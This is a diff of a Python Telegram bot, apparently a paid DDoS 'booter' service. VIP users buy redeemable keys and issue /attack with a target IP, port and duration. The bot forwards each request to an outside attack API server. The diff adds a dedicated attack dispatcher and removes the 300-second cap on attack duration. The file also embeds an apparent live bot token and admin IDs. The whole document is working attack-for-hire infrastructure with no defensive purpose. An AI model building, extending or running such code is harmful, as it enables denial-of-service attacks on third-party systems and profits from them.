@@ -12,6 +12,7 @@ TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
 ADMIN_ID = 8787952549
 CHANNEL_ID = "-1003605767830"
 CHANNEL_LINK = "https://t.me/+jMe1PNQv_koxNzI1"
+# Yahan check karo ki API link sahi hai ya nahi
 API_URL = "http://13.203.71.127/attack"
 API_KEY_DDoS = "DESTRUCTED"
 
@@ -34,7 +35,7 @@ def save_db(file, data):
 users = load_db("users.json")
 keys = load_db("keys.json")
 
-# --- UTILS ---
+# --- CORE LOGIC ---
 def is_joined(user_id):
     try:
         status = bot.get_chat_member(CHANNEL_ID, user_id).status
@@ -46,8 +47,31 @@ def get_progress_bar(remaining, total):
     bar = "▓" * filled + "░" * (10 - filled)
     return f"[{bar}] {int(((total - remaining) / total) * 100)}%"
 
+# --- POWERFUL ATTACK DISPATCHER ---
+def send_attack_request(target, port, duration):
+    try:
+        # Added timeout and verified params
+        response = requests.get(
+            API_URL, 
+            params={"ip": target, "port": port, "time": duration, "key": API_KEY_DDoS},
+            timeout=10
+        )
+        return response.status_code == 200
+    except:
+        return False
+
 def update_progress(chat_id, msg_id, target, port, duration):
     start_time = time.time()
+    # Pehle API trigger karte hain
+    success = send_attack_request(target, port, duration)
+    
+    if not success:
+        bot.edit_message_text("❌ **API SERVER ERROR**\nAttack failed to trigger on servers.", chat_id, msg_id)
+        # Remove from active if failed
+        global active_attacks
+        active_attacks = [a for a in active_attacks if a['target'] != target]
+        return
+
     while time.time() - start_time < duration:
         rem = int(duration - (time.time() - start_time))
         progress = get_progress_bar(rem, duration)
@@ -58,31 +82,25 @@ def update_progress(chat_id, msg_id, target, port, duration):
             )
         except: break
         time.sleep(5)
+    
     try:
         bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` successfully finished.", chat_id, msg_id)
     except: pass
-    global active_attacks
-    active_attacks = [a for a in active_attacks if a['target'] != target]
+    
+    active_attacks[:] = [a for a in active_attacks if a['target'] != target]
 
-# --- HANDLERS ---
+# --- COMMAND HANDLERS ---
 
 @bot.message_handler(commands=['start'])
 def start(message):
     uid = str(message.from_user.id)
     uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
-    
-    if uid not in users:
-        users[uid] = {"expiry": 0, "username": uname}
-    else:
-        users[uid]["username"] = uname
+    if uid not in users: users[uid] = {"expiry": 0, "username": uname}
     save_db("users.json", users)
 
-    remove_markup = telebot.types.ReplyKeyboardRemove()
-    
     if is_joined(message.from_user.id):
         slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
         role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
-        
         dashboard = (
             "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -95,151 +113,86 @@ def start(message):
             "👉 /running - Live Attacks\n"
             "👉 /redeem - Activate Key\n"
             "👉 /myid - Your Info\n"
-            "👉 /plans - Pricing\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             "👑 **OWNER:** @sastadeveloper"
         )
-        bot.send_message(message.chat.id, dashboard, reply_markup=remove_markup)
+        bot.send_message(message.chat.id, dashboard, reply_markup=telebot.types.ReplyKeyboardRemove())
     else:
-        markup = telebot.types.InlineKeyboardMarkup()
-        markup.add(telebot.types.InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK))
-        bot.send_message(message.chat.id, "❌ **ACCESS DENIED**\nJoin channel to use terminal.", reply_markup=markup)
+        bot.send_message(message.chat.id, "❌ **JOIN CHANNEL FIRST**\n" + CHANNEL_LINK)
 
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
     uid = str(message.from_user.id)
-    if not is_joined(message.from_user.id):
-        bot.reply_to(message, "🚨 Join channel first!")
-        return
+    if not is_joined(message.from_user.id): return
     if users[uid]['expiry'] < time.time() and int(uid) != ADMIN_ID:
-        bot.reply_to(message, "🚫 **VIP REQUIRED**")
-        return
+        bot.reply_to(message, "🚫 VIP Required."); return
     if len(active_attacks) >= MAX_CONCURRENT:
-        bot.reply_to(message, f"⚠️ **SLOTS FULL ({len(active_attacks)}/{MAX_CONCURRENT})**")
-        return
+        bot.reply_to(message, "⚠️ SLOTS FULL."); return
 
     try:
         args = message.text.split()
         target, port, duration = args[1], args[2], int(args[3])
-        if duration > 300: duration = 300
         active_attacks.append({"target": target, "end_time": time.time() + duration})
-        threading.Thread(target=lambda: requests.get(API_URL, params={"ip":target,"port":port,"time":duration,"key":API_KEY_DDoS})).start()
-        msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
+        
+        msg = bot.send_message(message.chat.id, "🛰️ **Sending Signal to API...**")
         threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
     except:
         bot.send_message(message.chat.id, "📝 `/attack <IP> <PORT> <TIME>`")
 
 @bot.message_handler(commands=['running'])
 def running(message):
-    global active_attacks
-    active_attacks = [a for a in active_attacks if a['end_time'] > time.time()]
+    active_attacks[:] = [a for a in active_attacks if a['end_time'] > time.time()]
     if not active_attacks:
-        bot.reply_to(message, "✨ No active attacks.")
-        return
-    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}** 🔥\n\n"
+        bot.reply_to(message, "✨ No active attacks."); return
+    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}**\n\n"
     for a in active_attacks:
-        rem = int(a['end_time'] - time.time())
-        txt += f"🚀 `TARGET: {a['target']}` | `TIME: {rem}s`\n"
+        txt += f"🚀 `{a['target']}` | `{int(a['end_time'] - time.time())}s` left\n"
     bot.send_message(message.chat.id, txt)
 
-# --- STEALTH ADMIN COMMANDS ---
-
+# --- ADMIN COMMANDS ---
 @bot.message_handler(commands=['genkey'])
-def admin_gen(message):
+def genkey(message):
     if message.from_user.id != ADMIN_ID: return
     try:
         args = message.text.split()
         days, count = int(args[1]), int(args[2])
-        new_list = []
+        new_keys = []
         for _ in range(count):
             k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
             keys[k] = {"duration": days * 86400, "used_by": None}
-            new_list.append(k)
+            new_keys.append(k)
         save_db("keys.json", keys)
-        bot.send_message(message.chat.id, f"🎫 **KEYS GENERATED:**\n`" + "\n".join(new_list) + "`")
-    except: bot.reply_to(message, "Usage: `/genkey <days> <count>`")
+        bot.send_message(message.chat.id, "🎫 **KEYS:**\n`" + "\n".join(new_keys) + "`")
+    except: bot.reply_to(message, "Usage: `/genkey 1 5`")
 
 @bot.message_handler(commands=['keys'])
 def show_keys(message):
     if message.from_user.id != ADMIN_ID: return
-    if not keys: bot.reply_to(message, "No keys in database."); return
-    txt = "🗝️ **MASTER KEY LIST**\n━━━━━━━━━━━━━━━\n"
+    txt = "🗝️ **KEYS:**\n"
     for k, v in keys.items():
-        status = f"✅ Used by: {v['used_by']}" if v['used_by'] else "🆓 Unused"
-        txt += f"🔑 `{k}` | {status}\n"
+        txt += f"`{k}` | {'Used: '+v['used_by'] if v['used_by'] else 'Unused'}\n"
     bot.send_message(message.chat.id, txt)
 
 @bot.message_handler(commands=['users'])
 def show_users(message):
     if message.from_user.id != ADMIN_ID: return
-    if not users: bot.reply_to(message, "No users found."); return
-    txt = "👥 **USER DATABASE**\n━━━━━━━━━━━━━━━\n"
-    for uid, data in users.items():
-        uname = data.get("username", "Unknown")
-        exp = data.get("expiry", 0)
-        status = "💎 VIP" if exp > time.time() else "🆓 FREE"
-        txt += f"🆔 `{uid}` | {uname} | {status}\n"
+    txt = "👥 **USERS:**\n"
+    for uid, d in users.items():
+        txt += f"`{uid}` | {d['username']}\n"
     bot.send_message(message.chat.id, txt)
-
-@bot.message_handler(commands=['remove_key'])
-def remove_key(message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        k = message.text.split()[1]
-        if k in keys:
-            del keys[k]; save_db("keys.json", keys)
-            bot.reply_to(message, f"✅ Key `{k}` deleted.")
-        else: bot.reply_to(message, "❌ Not found.")
-    except: bot.reply_to(message, "Usage: `/remove_key <KEY>`")
-
-@bot.message_handler(commands=['clear_keys'])
-def clear_keys_cmd(message):
-    if message.from_user.id != ADMIN_ID: return
-    global keys
-    keys = {}
-    save_db("keys.json", keys)
-    bot.reply_to(message, "🗑️ **ALL KEYS DELETED SUCCESSFULLY.**")
-
-# --- USER COMMANDS ---
 
 @bot.message_handler(commands=['redeem'])
 def redeem(message):
     uid = str(message.from_user.id)
-    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
-    if uid not in users: users[uid] = {"expiry": 0, "username": uname}
-
     try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
-            return
-            
-        k = parts[1]
+        k = message.text.split()[1]
         if k in keys and keys[k]['used_by'] is None:
-            current_time = time.time()
-            if users[uid]['expiry'] < current_time:
-                users[uid]['expiry'] = current_time + keys[k]['duration']
-            else:
-                users[uid]['expiry'] += keys[k]['duration']
-                
-            keys[k]['used_by'] = uname
-            save_db("users.json", users)
-            save_db("keys.json", keys)
-            bot.reply_to(message, "👑 **VIP ACCESS GRANTED!**\nYour plan has been activated.")
-        else:
-            bot.reply_to(message, "❌ **Key Invalid or Already Used.**")
-    except:
-        bot.reply_to(message, "⚠️ System Error.")
+            users[uid]['expiry'] = max(users[uid]['expiry'], time.time()) + keys[k]['duration']
+            keys[k]['used_by'] = f"@{message.from_user.username}"
+            save_db("users.json", users); save_db("keys.json", keys)
+            bot.reply_to(message, "👑 **VIP ACTIVATED**")
+        else: bot.reply_to(message, "❌ Invalid Key.")
+    except: bot.reply_to(message, "`/redeem <KEY>`")
 
-@bot.message_handler(commands=['myid', 'plans'])
-def info_hub(message):
-    uid = str(message.from_user.id)
-    if 'myid' in message.text:
-        exp = users.get(uid, {}).get("expiry", 0)
-        rem = time.strftime('%Y-%m-%d %H:%M', time.localtime(exp)) if exp > time.time() else "EXPIRED"
-        bot.reply_to(message, f"👤 **ID:** `{uid}`\n📅 **EXPIRY:** `{rem}`")
-    else: bot.reply_to(message, "💎 **PLANS:** 1 Day: 100 | 7 Day: 400 | 30 Day: 2000")
-
-print("SASTA DEVELOPER v9.2 FULLY READY...")
+print("v10.0 POWER TERMINAL ONLINE...")
 bot.infinity_polling()
-        
